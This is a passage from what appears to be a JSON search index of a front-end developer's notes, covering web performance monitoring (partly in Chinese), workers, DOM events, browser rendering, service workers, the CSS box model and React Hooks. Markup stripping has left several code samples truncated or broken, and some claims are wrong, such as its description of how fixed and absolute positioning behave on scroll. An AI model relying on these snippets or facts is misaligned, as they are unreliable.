developed a plan to address the problems they found, leading to a 20% reduction in page load time and a 10% increase in conversion rate.\n\n一些对于首屏的改进，对用户体验提升明显\n\n衡量的方式\n\n对于不同的页面，我们可以有不同的衡量方式\n\n对于主要用于展示的内容页，我们可以用syn的方式，比如lighthouse，做提前的检测\n对于重交互的页面，比如登录表单之类的，我们可以用rum的监测，来记录到底用户体验如何\n\nHow\n\n监控什么\n\n首先我们需要知道应该监控些什么呢？有哪些具体的指标？\n\n一个页面被打开有很多阶段，这些阶段，既不一定存在，也不一定连续。如下：\n\nGoogle有RAIL模型和Progressive Web Metrics标准去衡量一个页面的表现。从中我们可以提炼出一些关键性的指标。\n\n性能指标：加载呈现又快又稳。加载到展现的性能指标和稳定性指标。\n\n秒开率：页面首屏加载时间小于1s的比例，也就是页面加载到onload事件触发时所消耗的时间。\nFP（first paint） 和 FCP（first content paint） 分别是指页面首次绘制和首次内容绘制。\nFMP(first meaningful paint)首次有意义绘制, 是页面可用性的度量标准。自定义程度比较高。TODO.\nTTFB(time to first byte, 首字节时间)，是指从浏览器发起第一个请求到数据返回第一个字节所消耗的时间，这个时间包含了网络时间，后端处理时间等等，可以作为一个链路数据综合参考指标。\n\n稳定性指标：先知已经覆盖大部分场景，这里做两个补充：\n\n白屏： 监测在无异常抛出的情况下的白屏。\n资源错误：静态资源加载错误，常见的就是404，资源地址不正确或者远程服务有问题。\n\n体验指标：操作反应灵敏。点击，滑动等交互响应及时，操作流畅，动画运行流畅。\n\n响应延迟：用户点击后页面没有响应或者响应时间超过100ms，用户感觉这次点击操作是延迟的。\n卡顿：统计浏览器中执行时间超过 50 ms 的任务，都是 longTask，可能会造成页面卡顿。\n滚动流畅性：滚动过程是否流畅，监测用户开始操作到页面开始滚动的时间差，按照前面的标准，小于100ms才会体验流畅。\nTTI（time to interactive, 可交互时间)：指页面已渲染出内容，同时可以响应用户的输入的时间。\nFID（First Input Delay），首次输入延迟，用户首次和页面交互到页面响应交互的时间。一般都是因为主线程阻塞，会导致响应慢。这个指标反映用户对当前页面的第一感觉，比如html渲染出来一个输入框，用点了输入框页面却没有响应，卡了一下才能输入内容，这个卡的时间就是FID。\n\n实现主要依赖了Performance接口，它允许访问当前页面性能相关的信息。它是High Resolution Time API的一部分。但是它被Performance Timeline API, the Navigation Timing API, the User Timing API, and the Resource Timing API 扩展增强了，实际上Performance的主要功能都是由这几个API提供的。\n\n除了专业维度，还有常规维度也是我们要一起收集的。只有这样，我们才能知道这个页面的具体情况。\n\n基本信息\n\nurl，浏览器，操作系统，时间等\n页面加载方式，是直接打开，还是刷新打开，还是前进后退打开等等\n是否启用 HTTP2、Service Worker\n\nSYN vs RUM\n\n从技术方面来讲，前端性能监控主要分为两种方式，一种叫做合成监控（Synthetic Monitoring，SYN），另一种是真实用户监控（Real User Monitoring，RUM）。\n\nSYN就是在一个模拟场景里，去提交一个需要做性能审计的页面，通过一系列的工具、规则去运行你的页面，提取一些性能指标，得出一个审计报告, 比如Google 的 Lighthouse。优缺点如下：\n\nRUM就是用户在我们的页面上访问，访问之后就会产生各种各样的性能指标，我们在用户访问结束的时候，把这些性能指标上传到我们的日志服务器上，进行数据的提取清洗加工，最后在我们的监控平台上进行展示的一个过程。优缺点如下：\n\n我们来对比一下：\n\n个人认为，RUM是更适合中台前端去做的，能定量分析页面，可定制化添加一些额外功能比如报表和告警，也容易有沉淀。\n\n量化分析\n\n在量化数据的展示上坚持一个原则：以90%位数为准。这个数字意味这什么呢，意味我们可以承诺90%的用户是可以满足这个数据的。\n\n比如，fp时间90%位数是1s，我们就可以承诺90%的用户的初次渲染时间在1s内。\n\n相比于容易受影响的平均值，这个数字可以帮助我们更好的去总结一些结果，作为作出重要承诺的一个依据。\n\n在量化分析上，提供了首屏，体验分和load静态文件资源这三个维度上的量化。\n\n首屏\n\n包括各种首屏参数，和不同时间段内的对比。\n\n体验分\n\n给出了一个综合的体验，对一些对前端页面没那么熟悉和匆匆一看的开发人员，可以提供一个大致的结果。\n\nload时静态文件资源\n\n即为load时的静态文件资源信息，会和上一个有数据的日期比较，得出一个变化比例。同时，会根据文件大小和传输大小，计算出缓存率。\n\n值得一提的是，有时候可能传输大小比文件大小还大，比较隐晦的判断依据如下：\n\n200本地缓存，0 transferSize，full encodedSize\n304， a little transferSize，0 encodedSize\n200, full transferSize，full encodedSize\n\n性能体验\n\n在性能体验上对谷歌rail模型的实践。同时，这种即时互动性能体验，也是rum监控区别于syn监控的最大不同。\n\nResponse\n\n正如谷歌所言，如果interactions超过了100ms，用户就会感到操作是不连续的。\n\n所以在响应延迟中，会记录包括点击和滚动的延迟时间。有三个图表可以帮助找出响应延迟事件出现的频率趋势，distinct和比较突出的响应延迟事件。\n\n同时，会根据fps，设备电量，异步请求等信息，给出一些可能的原因。\n\nAnimation and Idle\n\n这两块谷歌分的比较细，要求也比较高。fps要求高达100，idle时间超过50ms，可以保证用户体验达到丝般顺滑，当然我们的要求可以适当低一些，fps在50就差不多了，再低用户感受可能就很不好了。\n\n会分别记录button点击和滚动屏幕两种时间：\n\n如果一个用户点击一个button, dom tree超过100ms没有任何变化，会记录为一次点击响应延迟时间，同时记录期间发生的异步请求和渲染记录。\n\n在用户滚动屏幕时，记录期间内平均fps和最低fps，如果低于设定值，记录为滚动响应延迟时间，同时记录期间发生的异步请求和渲染记录。\n\n这两种是特别典型的场景，可以帮助前端同学找出最影响用户体验的地方。\n\nLoad\n\n基于谷歌的心理学分析，如果一个页面超过5秒不可交互，那用户gone的可能性就大大增加。当然对于千寻的业务，其实影响不那么大，真的有人有会冲动消费定位服务吗。\n\n但是，这个部分相当体现前端的价值，因为load时间缩短，直接体现了有些优化的价值，比如缓存，合并批操作，渲染逻辑等等。具体参见首屏。\n\n上报\n\n在接入的sdk上报上有两个点要去满足：\n\n不影响前端主项目的工作\n减小对后端服务的压力，避免服务挂掉\n\n流程如下：\n\n前端在调用init只会初始化一个Reporter类，在接下来的调用中，用到了那些collect模块才会去实例化用到的模块。在long poll中收集数据，不为空的话才会批量压缩用Image Beacon上报。\n\n后端只存disk返回204，然后定时任务逐条处理。\n\n总结一下，现在的处理方式核心理念是实时记录，后置处理。在这种设计下，可以很有信心的保证sdk在记录全面的前提下不会影响性能，后端服务不会挂掉。\n\n更进一步，在以后的迭代中，可以直接取sls或者nginx的记录来处理分析，服务本身连disk都不用存。如果是nginx的话，甚至连收集接口都可以直接去掉，slb配置返回204，service就是纯粹的定时任务。\n\nReference\n","title":"Web Performance"},"content_negotiation.html":{"content":"Content Negotiation\n\nAccept Headers\n\nAccept-Encoding and Content-Encoding\n\nVary\n\nurl + specific http headers = cached resource\n\nNot Match\n\n406 Not acceptable\n\nReference\n","title":"Content Negotiation"},"web_worker.html":{"content":"Basic use\n\nAs we know, JS only has one thread to process CPU tasks. In order to improve its calculation performance,\nlike other languages' multiple threads function, Web Worker can create a new thread that can be in charge of CPU-bound\ntasks.\n\nFor example:\n\n//main thread\nconst worker = new Worker('worker.js');\nworker.postMessage('Hi');\nworker.onmessage = e => {\n    console.log(e.data);\n    worker.terminate();\n}\n\n//web worker\nimportScripts('....');  //load other reource\n\nconst _self = this;\n_self.addEventListener('message', e => {\n    console.log(e.data);\n    _self.postMessage('I am working');\n})\n\nExcept using a independent as Web Worker, a Blob object can be too. like:\n\nconst task = new Blob([`importScripts('....');  //load other reource\n\n                        const _self = this;\n                        _self.addEventListener('message', e => {\n                            console.log(e.data);\n                            _self.postMessage('I am working');\n                        })`],  { type: 'application/javascript' });\nconst worker = new Worker(URL.createObjectURL(task));\nworker.postMessage('Hi');\nworker.onmessage = e => {\n    console.log(e.data);\n    worker.terminate();\n}\n\nWorker-loader\n\nworker-loader uses webpack to pack worker.js file to string and load in\nmain thread, which is more convenient to use and maintain.\n\nDifferences compared to main thread\n\nCompared to main thread, Web Worker has some limits such as:\n\nsame source\n\nthe script file loaded by Web Worker must from the same source of main thread script file.\n\nDOM operation\n\nWeb Worker cannot operate DOM, any DOM operation should be in main thread script. window.navigator and\nlocation is accessible in Web Worker.\n\ncontext\n\nWeb Worker has an independent context, any communication with main thread has to transfer by\nmessage.\n","title":"Basic use"},"web_event.html":{"content":"DOM Event\n\nEvent Flow\n\n> Capture => Target => Bubbling\n\nTrigger Order\n\ncapturing: parent => child\nbubbling: child => parent\n\nRegister Handler\n\naddEventListener\n\n> Definitely, it is the recommended way.\n\nHTML attribute\n\n> This method should be avoided! It inflates the markup, and makes it less readable. Concerns of content/structure and behavior are not well-separated, making a bug harder to find.\n\nDOM element properties\n\n// Assuming myButton is a button element\nmyButton.onclick = function(event){alert('Hello world')}\n\n> The problem with this method is that only one handler can be set per element and per event.\n\nEvent Target\n\ntarget\n\nit is a reference to the object onto which the event was dispatched.\n\ncurrentTarget\n\nIt identifies the current target for the event.\n\nthis\n\nIf it is not the anonymous function, it identifies the current target for the event.\n\nEvent Methods\n\nstopPropagation\n\nprevents further propagation of the current event in the capturing and bubbling phases.\n\nstopImmediatePropagation\n\nIt prevents other listeners of the same event from being called.\n\npreventDefault\n\nits default action should not be taken as it normally would be.\n\n> See online examples in here.\n\nEvent Proxy\n\nAssuming there is a list including lots of lines and every line need to bind a event, if we bind a event to each line, it will cost a large number of memory.\n\nNormally, using event proxy to do it, like as below:\n\n    1\n    2\n    3\n\ndocument.getElementById('list').addEventListener('click', e => {\n    if (e.target.nodeName.toLocaleLowerCase() === 'li') {\n        console.log('the content is: ', e.target.innerHTML);\n    }\n});\n\nReference\n","title":"DOM Event"},"wasm.html":{"content":"WebAssembly\n\nWhat is WebAssembly\n\nOld rules, let's see the definition of WebAssembly:\n\n> WebAssembly is a binary instruction format for a stack-based virtual machine.\n\nSo, WASM is not a specific programming language, but a bytecode standard. Whatever we write any language, it will be finally compiled to LLVM bytecode implemented by the language's compiler itself.\n\nAlso, it doesn't mean their performance is the same.\n\nThere is a browser support list.\n\nA WASM Demo\n\nThere is a demo base on Rust, to calculate fibonacci(30). I run it in different browsers, their logs are as below:\n\nChrome:\n\n832040\n9\n832040\n28\n\nSafari:\n\n832040\n6\n832040\n35\n\nFirefox:\n\nTypeError: Response has unsupported MIME type\n\nAs we can see, in Chrome and Safari, wasm function is able to obviously improve CPU-bound\ntasks.\n","title":"WebAssembly"},"browser_render.html":{"content":"Browser Rendering\n\nBrowser Structure\n\nBefore talking about the steps of browser rendering, it's important to know modern browser's structure.\n\nThere is an image showing Firefox's structure:\n\nSafari and Chrome use Webkit as their rendering engine instead of Gecko.\n\nSafari uses JavaScriptCore as their JS engine, while Chrome use V8.\n\nWebkit is an open source rendering engine originally designed for Linux, and Apple transplanted it to Mac and Windows.\n\nProcess\n\nWhen a modern browser is rendering a html page, the main steps are as below:\n\nAs we can see, there are 5 main steps:\n\nparse HTML to DOM Tree.\nsimultaneously, parse style files to style rules.\ncombine DOM Tree and style rules to Render Tree.\ncalculate layout and style, such as position, size, color.\nrender each Render Tree node in the screen.\n\nBlock DOM parsing or rendering\n\nWhen browser meets a `` tag, it will block parsing DOM and next JS execution until the script is loaded.\n\nDuring this time, browser will render parsed DOM before this `` in order to avoid wasting waiting time.\n\nAs a contrast, if browser meets a `` tag, it will keep parsing DOM, block Render, block next execution of JS script, like as below:\n\n    web render block\n\n\t\tvar t1 = Date.now();\n\n\t\t  test\n\n\t// there will be a long time\n\tconsole.log(Date.now() - t1);\n\nIf inspecting facebook's index html file, we can see most of ` are put ahead of , and most of ` are on the bottom.\n\nThe reason is tha ` block DOM parsing, ` is not.\n\nCSS import without blocking rendering\n\nFirstly, setting link's media as none, this property can guarantee this CSS can be loaded without blocking rendering.\n\nNext, when it is loaded, setting the media to all. Like as below:\n\n    web render block\n\n\t\tvar t1 = Date.now();\n\n\t\t  test\n\n\tconsole.log(Date.now() - t1);\n\nNotice: It may lead screen's style rules to change multiple times in a short time.\n\nJS import without blocking DOM parsing\n\nWe can two properties async and defer to control it. Their differences are as below:\n\nReflow and Repaint\n\nReflow, or Relayout, means the size of node has been changed, therefore the render engine needs to recalculate a large part of or total Render Tree.\n\nRepaint, such as set visibility: hidden or change font color, doesn't include the change of size, which means it will only impacts a part of Render Tree, not involve others.\n\nIn some cases, such as changing elements' style at batch, browser will accumulate the operations changing element's style, and execute them at once, which is called increment reflow or asynchronize reflow.\n\nDOMContentLoaded and load\n\nThe DOMContentLoaded event fires when the initial HTML document has been completely loaded and parsed, without waiting for stylesheets, images, and subframes to finish loading.\n\nThe load event is fired when the whole page has loaded, including all dependent resources such as stylesheets and images.\n\nReference\n","title":"Browser Rendering"},"requestAnimationFrame.html":{"content":"requestAnimationFrame\n\nWhy we need requestAnimationFrame\n\nWhen we want to implement some of animation in the browser, the first thing in our mind must be CSS, like animation with @keyframes, or transition.\n\nBut for the tasks whose animation is driven by complex data structure, JS is still the only choice.\n\nThere is an example in fiddle, we can see the animation will be stuck while the main thread is being used, such as scripting or rendering.\n\nUnder this circumstance, requestAnimationFrame can be a good choice.\n\nThere is a solution via requestAnimationFrame in fiddle.\n\nCompared to the first animation, The second animation is smoother, the reason is that setTimeout cannot make sure the task can be executed within specific interval while there is a task occupying the main thread.\n\nHow requestAnimationFrame works\n\nrequestAnimationFrame will request that your animation function be called before the browser performs the next repaint.\n\nThe number of callbacks is usually 60 times per second, but will generally match the display refresh rate in most web browsers as per W3C recommendation.\n\nIn this way, requestAnimationFrame's interval is more stable, and aim to animation, browsers do more optimization via requestAnimationFrame.\n\nuse requestAnimationFrame to calculate FPS\n\nAs requestAnimationFrame is called between two repaint time point, in this way, it can be used to calculate FPS.\n\nconst getFpsAtTimePoint = () => {\n  return new Promise((resolve) => {\n    requestAnimationFrame((t1) => {\n      requestAnimationFrame((t2) => {\n        resolve(Math.round(1000 / (t2 - t1)));\n      });\n    });\n  });\n};\n\nconst getFpsWithinTheSecond = () => new Promise(resolve => {\n\tlet repaint = 0;\n\tconst start = performance.now();\n\tconst withRepaint = () => {\n\t\trequestAnimationFrame(() => {\n\t\t\tif ((performance.now() - start)  {\n\tlet repaint;\n\tlet stop;\n\tlet ret;\n\tlet start;\n\tconst init = () => {\n\t\tret = undefined;\n\t\tstop = false;\n\t\trepaint = 0;\n\t\tstart = performance.now();\n\t};\n\tinit();\n\tconst withRepaint = () => {\n\t\trequestAnimationFrame(() => {\n\t\t\tif (!stop) {\n\t\t\t\trepaint += 1;\n\t\t\t\twithRepaint();\n\t\t\t}\n\t\t});\n\t};\n\treturn {\n\t\tstart: () => {\n\t\t\tinit();\n\t\t\twithRepaint();\n\t\t},\n\t\tend: () => {\n\t\t\tstop = true;\n\t\t\tif (!ret) ret = repaint / ((performance.now() - start) / 1000);\n\t\t\treturn ret;\n\t\t}\n\t}\n};\n\nReference\n","title":"requestAnimationFrame"},"service_worker.html":{"content":"Service Worker\n\nPermission\n\nCompared to Web Worker, Service Worker has higher permission.\n\n        operation\n        Web Worker\n        Service Worker\n\n        close current tag\n        close process\n        keep process\n\n        agent solicitation\n        accessible\n        unaccessible\n\n        Cache Storage\n        unaccessible\n        accessible\n\n        backgroud push\n        no\n        yes\n\n        background sync\n        no\n        yes\n\n        security requirement\n        none\n        must be https or localhost\n\nbasic use\n\nFirst of all, regist this Service Worker in main thread.\n\nNext, in Service Worker script, in install event, define the files that needs to be save in caches, which is a read-only property returns the CacheStorage object associated with the service worker.\n\nThen, in fetch event, get caches to load instead requesting to server.\n\n//main thread regist\nif ('serviceWorker' in navigator) {\n  navigator.serviceWorker.register('/sw.js').then(function(registration) {\n    // Registration was successful\n    console.log('ServiceWorker registration successful with scope: ',    registration.scope);\n  }).catch(function(err) {\n    // registration failed :(\n    console.log('ServiceWorker registration failed: ', err);\n  });\n}\n//sw.js\nconst cacheName = 'v1';\nvar assetsToCache = [   //the path of files that needs to be saved in caches\n  '/styles/main.css',\n  '/script/main.js'\n];\nself.addEventListener('install', function(event) {\n  event.waitUntil(\n    caches.open(cacheName).then(function(cache) {\n      return cache.addAll(assetsToCache);   //request files resource and save in caches\n    }).then(function() {\n      return self.skipWaiting();\n    });\n});\n//intercept GET and check in caches\nself.addEventListener('fetch', function(event) {\n  var requestUrl = new URL(event.request.url);\n  if (requestUrl.origin === location.origin) {\n      if (requestUrl.pathname === '/') {\n      event.respondWith(\n        caches.open(cacheName).then(function(cache) {\n          return fetch(event.request).then(function(networkResponse) {\n            cache.put(event.request, networkResponse.clone());\n            return networkResponse;\n          }).catch(function() {\n            return cache.match(event.request);\n          });\n        })\n      );\n    }\n  }\n  event.respondWith(\n    caches.match(event.request).then(function(response) {\n      return response || fetch(event.request);\n    })\n  );\n});\n\nAbout caches API, see here.\n\nSome tips\n\nonly GET request can be saved\n\nService Worker can receive fetch events in same path. For example, if the Service Worker file is in\n/sub, it can't get fetch event in path /.\n\ncaches size has limit. check here.\n\nBy default, Service Work will update the file each 24 hours.\n\nworkbox\n\nVia Google's workbox, we don't need to write lots of Service Worker code to save caches and update files' version.\nIn create-react-app, it will be installed automatically. workbox.\n\nIf you use it to create React project, there is a file named service-worker.js and precache-manifest.[hash].js in the build,\nAs below:\n\n//import workbox script\nimportScripts(\"https://storage.googleapis.com/workbox-cdn/releases/4.3.1/workbox-sw.js\");\n//import precache-manifest\nimportScripts(\n  \"/precache-manifest.2cd68ada852c92872b4d0460d6667f6f.js\"\n);\n\nself.addEventListener('message', (event) => {\n  if (event.data && event.data.type === 'SKIP_WAITING') {\n    self.skipWaiting();\n  }\n});\n\nworkbox.core.clientsClaim();\n\nself.precacheManifest = [].concat(self.precacheManifest || []);\n//declare the file that needs to be saved in caches\nworkbox.precaching.precacheAndRoute(self.__precacheManifest, {});\n\nworkbox.routing.registerNavigationRoute(workbox.precaching.getCacheKeyForURL(\"/index.html\"), {\n\n  blacklist: [/^\\/_/,/\\/+\\.+$/],\n});\n\nAnd in precache-manifest we can see:\n\nself.precacheManifest = (self.precacheManifest || []).concat([\n  {\n    \"revision\": \"1a3b75ef22b2e98cc7c9ebaba56d802b\",\n    \"url\": \"/index.html\"\n  },\n  {\n    \"revision\": \"7558c4b96fbf38782a1f\",\n    \"url\": \"/static/css/main.237a1b42.chunk.css\"\n  },\n  {\n    \"revision\": \"59d8ab21f38e8a1d3f64\",\n    \"url\": \"/static/js/0.079d22b2.chunk.js\"\n  },\n  {\n    \"revision\": \"01ad347310a4099197cb\",\n    \"url\": \"/static/js/1.5cc2483c.chunk.js\"\n  },\n  {\n    \"revision\": \"a1c05097c251637a6568\",\n    \"url\": \"/static/js/4.3d58efea.chunk.js\"\n  },\n  {\n    \"revision\": \"7558c4b96fbf38782a1f\",\n    \"url\": \"/static/js/main.d8fc5b5b.chunk.js\"\n  },\n  {\n    \"revision\": \"5ad2e17ec9d2caecd451\",\n    \"url\": \"/static/js/runtime~main.3ac4b0b3.js\"\n  }\n]);\n\nThe url is files' path, and the revision is the files' content hash value, which will be changed if files is changed.\nIn this way, workbox can know whether the file is updated.\n\nEnd\n\nWith the development of PWA, I believe Web App is able to be closed to Native App in many respects.\n\nIf there is some wrongs, welcome to leave a message.\n","title":"Service Worker"},"v8_bytecode.html":{"content":"V8 Byte Code\n\nNodejs\n\n// test.js\nfunction bytecodeTest() {\n  var a = 1;\n}\nbytecodeTest();\n\nnode --print-bytecode test.js | grep 'generated bytecode for function: bytecodeTest' -A 100\n\nReference\n","title":"V8 Byte Code"},"box_model.html":{"content":"Box Model\n\nAll HTML elements can be considered as boxes. In CSS, the term \"box model\" is used when talking about design and layout.\n\nThe CSS box model is essentially a box that wraps around every HTML element. It consists of: margins, borders, padding, and the actual content.\n\nThere is a screenshot from Chrome:\n\nMargin collapse\n\nYou can see this example in Here:\n\n    p1\n    p2\n\np{\n    margin: 10px;\n}\n\nIn the final result, the top margin of p2 is 0. In other word, its margin merged with p1's bottom margin.\n\nBut if we set float: left;, the horizontal margin won't collapse. As only one type of margin can collapse: Vertical (top and bottom). Margin collapse never applies to horizontal (left and right) margins.\n\nheight and width in Box Model\n\nIf we set width:100%, the element will exceed the whole page, its width actually is larger than 100%. Because the default box-sizing is content-box, which won't involve margin and padding's value into calculation.\n\nAnother choice is border-box, which will involve both content and padding size into calculation, still without margin.\n\nBFC\n\nA Block Formatting Context is part of the visual CSS rendering of a web page in which block boxes are laid out. The positioning scheme to which it belongs is normal flow\n\nIt is an HTML box that satisfies at least one of the following conditions:\n\nThe value of float is not none\nThe value of position is neither static nor relative\nThe value of display is table-cell, table-caption, inline-block, flex, or inline-flex\nThe value of overflow is not visible.\n\nPosition\n\nfix\n\nthe element is positioned related to the browser window, not BFC. The element will scroll with page scrolling.\n\nabsolute\n\nthe element is positioned absolutely to its first positioned parent, not BFC. The element won't scroll with page scrolling.\n\nrelative\n\nthe element is positioned relative to its normal position.\n\nstatic\n\nthis is the default value, all elements are in order as they appear in the document.\n\nsticky\n\nthe element is positioned based on the user's scroll position.\n","title":"Box Model"},"pseudo_classes.html":{"content":"Pseudo Classes and Pseudo Elements\n\nCSS introduces the concepts of pseudo-elements and pseudo-classes to permit formatting based on information that lies outside the document tree.\n\nPseudo Classes\n\nA pseudo-class filters existing elements when the filter condition is not exist in DOM, such as hover and active.\n\nExample: :hover\n\n:hover: Selects links on mouse over\n\n  first line\n\n.test-class p:hover {\n    color: red;\n}\n\nPseudo Elements\n\nA pseudo-element is a new fake element when the selected elements is not exist in DOM, such as first character in a `` tag.\n\nExample: ::before and ::after\n\n::before: Insert content before every `` element\n::after: Insert content after every `` element\n\n  first line\n  second line\n  third line\n\n.test-elements p::after {\n    content: \" - after\";\n}\n.test-elements p::before {\n    content: \"before - \";\n}\n\nReference\n","title":"Pseudo Classes and Pseudo Elements"},"diff.html":{"content":"React Reconciliation\n\nIn React, the most significant feature is Virtual DOM which is based on Diff Algorithm.\n\nBy understanding diff in React, we are able to write a React Application with higher performance.\n\nDiff Strategy\n\nThere is an easiest diff function to traverse an tree by recursion as below:\n\nconst result = [];\n// compare sub nodes\nconst diffLeafs = function (beforeLeaf, afterLeaf) {\n    // get the max length of last tree and next tree\n    let count = Math.max(beforeLeaf.children.length, afterLeaf.children.length);\n    for (let i = 0; i\n\ntips:\n\nKeep the structure of DOM stable, changing the tree structure as less as possible.\nWhen we need to remove and add a node frequently, we can use CSS to hide it, instead of removing it from the DOM tree.\n\nComponent Diff\n\nReact assumes that the same components will generate the same DOM structure, in contrast, different components will generate a different DOM structure.\n\nThe component like as below is that we need to avoid when we using React:\n\ntips:\n\nuse shouldComponentUpdate or React.memo (PureComponent) to avoid unnecessary rendering.\nUI with the similar structure can be wrote as a component.\n\nElement Diff\n\nFor elements they are in the one level and same list, they can be recognized by an unique key.\n\nFor those elements they changed their position, React use a principle previousIndex > currentIndex => Not Move to judge which elements need to be moved.\n\nIn this situation, all elements except D will be moved. Obviously, it's a huge cost of performance.\n\ntips:\n\nadd a real unique key in list.\navoid to shift the last element in a list to the head.\n\nMore Optimization\n\nAnonymous function in JSX\n\nif writing anonymous function in JSX, every time React rerender, it will re-execute the anonymous function.\n\nBecause React uses === to compare props:\n\n(() => {}) === (() => {}); // false\n\nFunction object in JS is reference type, in this way, even the same anonymous function will be treated as different object to trigger re-execute.\n\nFor those components rendered frequently, we'd better to use useCallback or useMemo to reduce its render times.\n\nReference\n","title":"React Reconciliation"},"isomorphic.html":{"content":"React Isomorphic\n\nTODO\n","title":"React Isomorphic"},"route.html":{"content":"React中的路由\n\n从前端路由讲起\n\n在更久远的年代，\n\n静态路由 Static Route\n\n从react-router 4.0版本之后，就不再提供静态路由了，think of routes as components. 之后社区也有@reach/router这样的解决方案。\n\n诚然，组件的形式更符合React的风格，而且更加灵活，也更符合react-router这样一个路由基础库的定位。\n\n但是在我们日常的业务开发中，其实静态路由是更加方便和易于理解查看的。\n\n路由守卫 Route Guard\n\n路由缓存 Keep Alive\n\n预加载 Prefetch\n\n转场动画 Transition Animation\n\nreact-routers\n\n本文中的代码实现和功能，都可以在react-routers这个库中找到，欢迎pr。\n","title":"React中的路由"},"event.html":{"content":"React Event\n","title":"React Event"},"hooks.html":{"content":"Hooks\n\nDefinition\n\nHooks are a new addition in React 16.8. They let you use state and other React features without writing a class.\n\nAnd now it has 10 official Hooks, including:\n\n> Basic Hooks\n\nuseState\nuseEffect\nuseContext\n\n> Additional Hooks\n\nuseReducer\nuseCallback\nuseMemo\nuseRef\nuseImperativeHandle\nuseLayoutEffect\nuseDebugValue\n\nBasic hooks is more important and frequently-used.\n\nMotivation\n\nBefore using Hooks, the first thing I want to figure out is that which kind of pain spots Hooks can solve?\n\nReuse code with state\n\nIf there are a range of reusable behavior to a component, I may use HOC with render props. Such as below:\n\nclass HOC extends React.Component{\n constructor(props) {\n    super(props);\n    this.state = {\n      sharingValue: 0\n    }\n }\n\n  componentDidMount(){\n    // mock some sharing behavior\n    this.setState({\n      sharingValue: 1\n    })\n  }\n\n  render(){\n    return (\n\n    )\n  }\n}\n\nObviously, HOC will change the components structure, and lead to \"wrapper hell\". It means components surrounded by layers of providers, consumers, higher-order components, render props, and other abstractions, which can make filter them out in DevTools\ndifficult.\n\nBut if we can use React Hooks, it makes more simple:\n\nconst sharingValue = () => {\n  const [sharingValue, changeSharingValue] = useState(initialSharingValue);\n  return sharingValue;\n};\n\nfunction Com1() {\n  const sharingValue = sharingValue();\n  return {sharingValue};\n}\n\nfunction Com2() {\n  const sharingValue = sharingValue();\n  return {sharingValue};\n}\n\nVia Hooks, it is more easy to share common functions without impacting components structure.\n\nHooks Examples\n\nuseState\n\nReturns a state value, and a function to update it. const [state, setState] = useState(initialState);\n\nBase on useState to update a component:\n\nfunction Example() {\n  const [count, setCount] = useState(0);\n\n  return (\n\n      You clicked {count} times\n       setCount(count + 1)}>Click me\n\n  );\n}\n\nExcept specific value, useState can accept a function which will be executed only on the initial render if the initial state\nis the result of an expensive computation:\n\nconst [state, setState] = useState(() => {\n  const initialState = someExpensiveComputation(props);\n  return initialState;\n});\n\nuseReducer\n\nAn alternative to useState. const [state, dispatch] = useReducer(reducer, initialArg, init);\n\nLike redux, useReducer can rreturn a state and function to dispatch event, as below:\n\nconst handleReducer = () => {\n  const initialState = { count: 0 };\n  const [state, dispatch] = useReducer((state, action) => {\n    switch (action.type) {\n      case \"increment\":\n        return { ...initialState, count: state.count++ };\n      case \"decrement\":\n        return { ...initialState, count: state.count-- };\n      default:\n        throw new Eroor();\n    }\n  });\n  return [\n    state,\n    action => {\n      dispatch(action);\n    }\n  ];\n};\nfunction Example() {\n  const [state, dispatch] = handleReducer();\n  return (\n\n      Count: {state.count}\n\n  );\n}\n\nuseEffect\n\nAccepts a function that contains imperative, possibly effectful code. useEffect(didUpdate);\n\nMutations, subscriptions, timers, logging, and other side effects are not allowed inside the main body of a function component (referred to as React’s render phase). Doing so will lead to confusing bugs and inconsistencies in the UI.\n\nInstead, use useEffect. The function passed to useEffect will run after the render is committed to the screen. Think of effects as an escape hatch from React’s purely functional world into the imperative world.\n\nconst changeDocumentTitle = useEffect(() => {\n  document.title = \"Changed in useEffect\";\n});\n\nBy default, effects run after every completed render like componentDidMount, componentDidUpdate and componentWillUnmount. But we can choose to fire them only when certain values have changed by second parameter:\n\nNow the subscription will only be recreated when props.source changes.\n\nwhich can be used to fired a callback only when first rendering to slove infinite render in MobX.\n\nconst changeDocumentTitle = useEffect(() => {\n  document.title = \"Changed in useEffect\";\n}, [someValue]);\n\nIn addition, the function returned in useEffect callback will be trigger after rendering, as clean-up function.\n\nconst changeDocumentTitle = useEffect(() => {\n  document.title = \"Changed in useEffect\";\n  return () => {\n    console.log(\"useEffect rerendered\");\n  };\n}, [someValue]);\n\nuseLayoutEffect\n\nThe signature is identical to useEffect, but it fires synchronously after all DOM mutations. Use this to read layout from the DOM and synchronously re-render. Updates scheduled inside useLayoutEffect will be flushed synchronously, before the browser has a chance to paint.\n\nThe point is that useLayoutEffect's time point is before useEffect during DOM render life cycle.\n\nUseContext\n\nAccepts a context object (the value returned from React.createContext) and returns the current context value for that context. const value = useContext(MyContext);\n\nThe current context value is determined by the value prop of the nearest  above the calling component in the tree.\n\nWhen the nearest  above the component updates, this Hook will trigger a rerender with the latest context value passed to that MyContext provider.\n\nThere is a example for passing values cross components:\n\n// parent.js\nimport { Child } from './child';\n\nexport const MyContext = React.createContext();\n\nexport function Parent(){\n  return (\n\n  )\n}\n\n// child.js\nimport { MyContext } from './parent';\n\nexport function Child(){\n  const context = useContext(MyContext);\n  return (\n\n      Count: {context.count}\n\n  )\n}\n\nuseRef\n\nuseRef returns a mutable ref object whose .current property is initialized to the passed argument (initialValue). The returned object will persist for the full lifetime of the component. const refContainer = useRef(initialValue);\n\nEssentially, useRef is like a “box” that can hold a mutable value in its .current property, like bolow:\n\nconst handleFoucsOnClick = () => {\n  const ele = useRef(null);\n  return {\n    ele,\n    handleClick: () => {\n      ele.current.focus();\n    }\n  };\n};\n\nfunction Example() {\n  const { ele, handleClick } = handleFoucsOnClick();\n  return ;\n}\n\nuseMemo\n\nReturns a memoized value. const memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);\n\nPass a “create” function and an array of dependencies. useMemo will only recompute the memoized value when one of the dependencies has changed. This optimization helps to avoid expensive calculations on every render.\\\n\nuseCallback\n\nReturns a memoized callback. const memoizedCallback = useCallback(() => {doSomething(a, b);},[a, b],);\n\nLike useMemo, when the dependencies has changed, the callback will be triggered.\n\nThis is useful when passing callbacks to optimized child components that rely on reference equality to prevent unnecessary renders (e.g. shouldComponentUpdate).\n\nIf useMemo and useCallback's second argument is an empty array, the value or function will be memoized once and always returned.\n\nIf the second argument is omitted, the value will never be memoized, and the useCallback and the useMemo doesn't do anything.\n\nReference\n\nThere is a source code of React Hooks for reference.\n","title":"Hooks"},"template_syntax.html":{"content":"Template Syntax\n\nv-if and v-show\n\nv-if is to totally remove the component from DOM, instead, 